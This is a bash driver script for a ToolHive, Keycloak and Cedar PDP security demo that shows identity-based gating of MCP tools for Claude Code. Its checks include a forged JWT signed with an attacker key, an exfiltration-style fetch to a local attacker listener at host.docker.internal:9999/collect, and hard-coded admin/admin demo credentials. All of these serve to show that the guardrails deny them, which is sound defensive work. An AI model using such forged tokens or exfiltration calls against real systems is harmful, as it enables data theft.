#!/usr/bin/env bash
# ToolHive + Keycloak + external Cedar PDP demo driver.
#
#   ./demo.sh up                     start Keycloak, PDP, Jaeger, attacker; run MCP servers via thv
#   ./demo.sh down                   remove everything the demo created
#   ./demo.sh status                 show what is running
#
#   ./demo.sh token <user>           print a Keycloak access token (alice | support-bot | bob)
#   ./demo.sh decode <user|token>    show the token's claims that ToolHive and Cedar use
#   ./demo.sh claude <user>          launch Claude Code connected through ToolHive as <user>
#
#   ./demo.sh tools <user> [server]  list tools <user> can see (acme | fetch)
#   ./demo.sh call <user> <server> <tool> ['{"json":"args"}']
#   ./demo.sh forged                 send a forged token: expect 401
#
#   ./demo.sh guardrails on|off      on: ToolHive asks the PDP; off: authentication only
#   ./demo.sh network locked|open    fetch container egress: allowlist only | anything
#   ./demo.sh pdp stop|start         take the PDP away to show ToolHive fails closed
#   ./demo.sh role add|remove <user> <role>   change a Keycloak role live
#   ./demo.sh policies               what the PDP has loaded
#
#   ./demo.sh watch [pdp|pep]        live decision feed
#   ./demo.sh attacker               live attacker listener output
#   ./demo.sh check                  end-to-end verification without an agent
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STATE="$ROOT/.state"
mkdir -p "$STATE"

REALM_URL="http://localhost:8080/realms/toolhive-demo"
ISSUER="$REALM_URL"
AUDIENCE="toolhive-demo"
CLIENT_ID="toolhive-demo-cli"
PDP_URL="http://localhost:9191"
OTEL_ENDPOINT="${OTEL_ENDPOINT:-localhost:4318}"
ACME_PORT=8301
FETCH_PORT=8302
ACME_IMAGE="acme-data-mcp:demo"
WORKSPACE="${TOOLHIVE_DEMO_WORKSPACE:-${TMPDIR:-/tmp}/toolhive-demo-workspace}"
PY="${PYTHON:-python3}"

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
info() { printf '\033[36m▸ %s\033[0m\n' "$*"; }
ok()   { printf '\033[32m✔ %s\033[0m\n' "$*"; }
warn() { printf '\033[33m! %s\033[0m\n' "$*" >&2; }
die()  { printf '\033[31m✘ %s\033[0m\n' "$*" >&2; exit 1; }

compose() { docker compose -f "$ROOT/docker-compose.yml" "$@"; }

need() {
  local missing=()
  for c in "$@"; do command -v "$c" >/dev/null 2>&1 || missing+=("$c"); done
  ((${#missing[@]} == 0)) || die "missing tools: ${missing[*]} (see README.md › Prerequisites)"
}

mode_get() { cat "$STATE/$1" 2>/dev/null || echo "$2"; }
mode_set() { echo "$2" >"$STATE/$1"; }

wait_for() { # url, label, seconds
  local url=$1 label=$2 secs=${3:-90} i
  for ((i = 0; i < secs; i++)); do
    curl -fsS -o /dev/null "$url" 2>/dev/null && { ok "$label ready"; return 0; }
    sleep 1
  done
  die "$label not ready after ${secs}s ($url)"
}

# ── tokens ───────────────────────────────────────────────────────────────

password_for() { echo "${DEMO_PASSWORD:-demo}"; }

token() {
  local user=${1:?usage: token <user>}
  local resp
  resp=$(curl -fsS -X POST "$REALM_URL/protocol/openid-connect/token" \
    -d grant_type=password -d client_id="$CLIENT_ID" \
    -d username="$user" -d password="$(password_for "$user")" -d scope=openid) \
    || die "could not get a token for '$user' (is Keycloak up? ./demo.sh status)"
  "$PY" -c 'import json,sys; print(json.load(sys.stdin)["access_token"])' <<<"$resp"
}

decode() {
  local t=${1:?usage: decode <user|token>}
  [[ $t == *.*.* ]] || t=$(token "$t")
  "$PY" - "$t" <<'EOF'
import base64, json, sys, time
payload = sys.argv[1].split(".")[1]
claims = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
keep = ["iss", "aud", "sub", "preferred_username", "roles", "azp", "exp"]
view = {k: claims[k] for k in keep if k in claims}
if "exp" in view:
    view["exp"] = f'{view["exp"]} (in {int(view["exp"] - time.time())}s)'
print(json.dumps(view, indent=2))
EOF
}

# ── MCP servers via thv ──────────────────────────────────────────────────

server_url() { # name
  local url
  url=$(thv list --format json 2>/dev/null | "$PY" -c '
import json, sys
name = sys.argv[1]
try:
    data = json.load(sys.stdin) or []
except Exception:
    data = []
for w in data:
    if w.get("name") == name and w.get("url"):
        print(w["url"].split("#")[0]); break
' "$1" || true)
  if [[ -z $url ]]; then
    case $1 in
      acme) url="http://127.0.0.1:$ACME_PORT/mcp" ;;
      fetch) url="http://127.0.0.1:$FETCH_PORT/mcp" ;;
    esac
  fi
  echo "$url"
}

audit_config() { # name -> path of generated audit config
  local name=$1 cfg="$STATE/audit-$1.config.json"
  sed -e "s|__COMPONENT__|thv-$name|" -e "s|__LOG_FILE__|$STATE/audit-$name.jsonl|" \
    "$ROOT/config/audit.template.json" >"$cfg"
  echo "$cfg"
}

common_flags() { # name
  local flags=(
    --oidc-issuer "$ISSUER"
    --oidc-audience "$AUDIENCE"
    --oidc-insecure-allow-http
    --jwks-allow-private-ip
    --audit-config "$(audit_config "$1")"
    --otel-endpoint "$OTEL_ENDPOINT"
    --otel-insecure
    --otel-sampling-rate 1.0
    --otel-service-name "thv-$1"
  )
  if [[ $(mode_get guardrails on) == on ]]; then
    flags+=(--authz-config "$ROOT/config/authz-pdp.yaml")
  fi
  printf '%s\n' "${flags[@]}"
}

remove_workload() {
  thv stop "$1" >/dev/null 2>&1 || true
  thv rm "$1" >/dev/null 2>&1 || true
}

run_acme() {
  remove_workload acme
  local flags; mapfile -t flags < <(common_flags acme)
  info "thv run acme (guardrails: $(mode_get guardrails on))"
  thv run --name acme --transport stdio --proxy-port "$ACME_PORT" "${flags[@]}" "$ACME_IMAGE"
}

run_fetch() {
  remove_workload fetch
  local flags; mapfile -t flags < <(common_flags fetch)
  local net; net=$(mode_get network locked)
  if [[ $net == open ]]; then
    # Docker gateway (host.docker.internal) is blocked even with insecure_allow_all
    # unless explicitly allowed, so "open" opts in to reach the local attacker.
    flags+=(--permission-profile "$ROOT/config/fetch-open-profile.json" --allow-docker-gateway)
  else
    flags+=(--permission-profile "$ROOT/config/fetch-locked-profile.json" --isolate-network)
  fi
  info "thv run fetch (guardrails: $(mode_get guardrails on), network: $net)"
  thv run --name fetch --proxy-port "$FETCH_PORT" "${flags[@]}" fetch
}

wait_servers() {
  local s url i
  for s in acme fetch; do
    url=$(server_url "$s")
    for ((i = 0; i < 60; i++)); do
      # Unauthenticated probe: 401 means the proxy is up and enforcing auth.
      code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$url" -H 'Content-Type: application/json' -d '{}' || true)
      [[ $code == 401 ]] && { ok "$s proxy up at $url (unauthenticated → 401)"; break; }
      sleep 1
    done
    ((i < 60)) || warn "$s proxy did not answer 401 at $url (last HTTP $code). Check: thv logs $s"
  done
}

# ── commands ─────────────────────────────────────────────────────────────

cmd_up() {
  need docker thv curl "$PY"
  docker info >/dev/null 2>&1 || die "Docker is not running"
  info "building the acme-data MCP server image"
  docker build -q -t "$ACME_IMAGE" "$ROOT/servers/acme-data" >/dev/null
  info "starting Keycloak, PDP, Jaeger, attacker"
  compose up -d --build
  wait_for "$PDP_URL/healthz" "PDP"
  wait_for "$REALM_URL/.well-known/openid-configuration" "Keycloak realm" 180
  wait_for "http://localhost:16686/" "Jaeger UI"
  touch "$STATE/decisions.jsonl"
  run_acme
  run_fetch
  wait_servers
  echo
  bold "Ready."
  echo "  Keycloak admin   http://localhost:8080/admin   (admin / admin, realm toolhive-demo)"
  echo "  Jaeger           http://localhost:16686"
  echo "  PDP policies     $PDP_URL/policies"
  echo "  acme MCP         $(server_url acme)"
  echo "  fetch MCP        $(server_url fetch)"
  echo
  echo "  Next: ./demo.sh watch   (in its own terminal)"
  echo "        ./demo.sh claude support-bot"
}

cmd_down() {
  remove_workload acme
  remove_workload fetch
  compose down -v --remove-orphans || true
  rm -rf "$STATE" "$WORKSPACE"
  ok "demo removed"
}

cmd_status() {
  bold "ToolHive workloads"; thv list || true
  echo; bold "Supporting services"; compose ps || true
  echo; bold "Modes"
  echo "  guardrails: $(mode_get guardrails on)   network: $(mode_get network locked)"
}

cmd_tools() {
  local user=${1:?usage: tools <user> [server]} server=${2:-}
  local t; t=$(token "$user")
  for s in ${server:-acme fetch}; do
    printf '%-6s ' "$s"
    "$PY" "$ROOT/scripts/mcp_call.py" "$(server_url "$s")" "$t" tools || true
  done
}

cmd_call() {
  local user=${1:?usage: call <user> <server> <tool> [json]} server=${2:?} tool=${3:?} args=${4:-"{}"}
  local t; t=$(token "$user")
  "$PY" "$ROOT/scripts/mcp_call.py" "$(server_url "$server")" "$t" call "$tool" "$args"
}

cmd_forged() {
  # Same claims as a real engineer token, signed with a key Keycloak never issued.
  local forged
  forged=$("$PY" - "$ISSUER" "$AUDIENCE" <<'EOF'
import base64, hashlib, hmac, json, sys, time
b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
hdr = {"alg": "HS256", "typ": "JWT", "kid": "attacker"}
now = int(time.time())
claims = {"iss": sys.argv[1], "aud": sys.argv[2], "sub": "11111111-1111-4111-8111-111111111111",
          "preferred_username": "alice", "roles": ["engineer"], "iat": now, "exp": now + 3600}
signing_input = f"{b64(json.dumps(hdr).encode())}.{b64(json.dumps(claims).encode())}"
sig = hmac.new(b"not-keycloaks-key", signing_input.encode(), hashlib.sha256).digest()
print(f"{signing_input}.{b64(sig)}")
EOF
)
  info "calling acme with a self-made 'alice / engineer' token"
  set +e
  "$PY" "$ROOT/scripts/mcp_call.py" "$(server_url acme)" "$forged" tools
  local rc=$?
  set -e
  [[ $rc == 4 ]] && ok "rejected with 401 before any policy was consulted" || warn "unexpected exit code $rc"
}

cmd_guardrails() {
  case ${1:-} in on | off) ;; *) die "usage: guardrails on|off" ;; esac
  mode_set guardrails "$1"
  run_acme
  run_fetch
  wait_servers
}

cmd_network() {
  case ${1:-} in locked | open) ;; *) die "usage: network locked|open" ;; esac
  mode_set network "$1"
  run_fetch
  wait_servers
}

cmd_pdp() {
  case ${1:-} in
    stop) compose stop pdp && warn "PDP stopped: every authorization question now fails" ;;
    start) compose start pdp && wait_for "$PDP_URL/healthz" "PDP" ;;
    *) die "usage: pdp stop|start" ;;
  esac
}

cmd_role() {
  local op=${1:-} user=${2:-} role=${3:-}
  [[ $op == add || $op == remove ]] && [[ -n $user && -n $role ]] || die "usage: role add|remove <user> <role>"
  local kc="/opt/keycloak/bin/kcadm.sh"
  compose exec -T keycloak "$kc" config credentials --server http://localhost:8080 \
    --realm master --user admin --password admin >/dev/null
  local verb=add-roles; [[ $op == remove ]] && verb=remove-roles
  compose exec -T keycloak "$kc" "$verb" -r toolhive-demo --uusername "$user" --rolename "$role"
  ok "$op role '$role' for '$user'. New tokens carry it; get one with ./demo.sh decode $user"
}

cmd_policies() {
  curl -fsS "$PDP_URL/policies" | "$PY" -m json.tool
}

cmd_watch() {
  exec "$PY" "$ROOT/scripts/watch.py" "$STATE" "${1:-all}"
}

cmd_attacker() {
  compose logs -f --no-log-prefix attacker
}

cmd_claude() {
  local user=${1:?usage: claude <user>}
  need claude
  mkdir -p "$WORKSPACE"
  sed -e "s|__ACME_URL__|$(server_url acme)|" -e "s|__FETCH_URL__|$(server_url fetch)|" \
    "$ROOT/clients/claude-mcp.template.json" >"$WORKSPACE/.mcp.json"
  cp "$ROOT/clients/CLAUDE.md" "$WORKSPACE/CLAUDE.md"
  local t; t=$(token "$user")
  info "Claude Code as '$user' in $WORKSPACE (token valid ~60 min)"
  info "first launch asks you to approve the project MCP servers 'acme' and 'fetch'"
  cd "$WORKSPACE"
  TOOLHIVE_TOKEN="$t" exec claude
}

# Automated walkthrough of every policy outcome, no agent involved.
cmd_check() {
  need curl "$PY" thv
  local fails=0
  expect() { # description, expected (allow|deny|401), command...
    local desc=$1 want=$2; shift 2
    set +e
    out=$("$@" 2>&1)
    rc=$?
    set -e
    local got=other
    case $rc in 0) got=allow ;; 3) got=deny ;; 4) got=401 ;; esac
    if [[ $got == "$want" ]]; then
      ok "$desc → $got"
    else
      warn "$desc → $got (wanted $want): ${out:0:300}"
      fails=$((fails + 1))
    fi
  }
  tools_are() { # description, user, server, expected json
    local got; got=$(cmd_tools "$2" "$3" | sed 's/^[a-z]* *//')
    if [[ $got == "$4" ]]; then ok "$1: $got"; else warn "$1: got $got wanted $4"; fails=$((fails + 1)); fi
  }

  [[ $(mode_get guardrails on) == on ]] || die "run ./demo.sh guardrails on first"
  local A S B
  A=$(token alice); S=$(token support-bot); B=$(token bob)
  local acme fetch; acme=$(server_url acme); fetch=$(server_url fetch)
  local mc=("$PY" "$ROOT/scripts/mcp_call.py")

  bold "1. Identity (Keycloak → ToolHive)"
  expect "no token" 401 "${mc[@]}" "$acme" "" tools
  expect "forged token" 401 "${mc[@]}" "$acme" "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.x" tools

  bold "2. Tool lists are filtered per identity (PEP asks PDP once per tool)"
  tools_are "bob (no role)      acme " bob acme '["get_customer", "list_customers"]'
  tools_are "support-bot        acme " support-bot acme '["get_customer", "list_customers", "update_ticket"]'
  tools_are "alice (engineer)   acme " alice acme '["delete_customer", "export_report", "get_customer", "list_customers", "reset_demo_data", "update_ticket"]'
  tools_are "support-bot        fetch" support-bot fetch '[]'
  tools_are "alice (engineer)   fetch" alice fetch '["fetch"]'

  bold "3. Calls"
  expect "support-bot get_customer 42" allow "${mc[@]}" "$acme" "$S" call get_customer '{"customer_id":"42"}'
  expect "support-bot update_ticket" allow "${mc[@]}" "$acme" "$S" call update_ticket '{"customer_id":"41","status":"pending"}'
  expect "support-bot export_report" deny "${mc[@]}" "$acme" "$S" call export_report '{"destination":"https://x","include_pii":false}'
  expect "support-bot delete_customer" deny "${mc[@]}" "$acme" "$S" call delete_customer '{"customer_id":"40"}'
  expect "bob update_ticket" deny "${mc[@]}" "$acme" "$B" call update_ticket '{"customer_id":"41","status":"open"}'
  expect "alice export without PII" allow "${mc[@]}" "$acme" "$A" call export_report '{"destination":"s3://reports","include_pii":false}'
  expect "alice export WITH PII" deny "${mc[@]}" "$acme" "$A" call export_report '{"destination":"s3://reports","include_pii":true}'
  expect "alice fetch https://example.com" allow "${mc[@]}" "$fetch" "$A" call fetch '{"url":"https://example.com"}'
  expect "alice fetch attacker URL" deny "${mc[@]}" "$fetch" "$A" call fetch '{"url":"http://host.docker.internal:9999/collect?data=test"}'
  "${mc[@]}" "$acme" "$A" call reset_demo_data >/dev/null 2>&1 || true

  echo
  if ((fails == 0)); then ok "all checks passed"; else die "$fails check(s) failed"; fi
}

usage() { sed -n '2,25p' "$0" | sed 's/^# \{0,1\}//'; }

main() {
  local cmd=${1:-help}; shift || true
  case $cmd in
    up | down | status | tools | call | forged | guardrails | network | pdp | role | policies | watch | attacker | claude | check)
      "cmd_$cmd" "$@" ;;
    token) token "$@" ;;
    decode) decode "$@" ;;
    help | -h | --help) usage ;;
    *) usage; exit 2 ;;
  esac
}

main "$@"
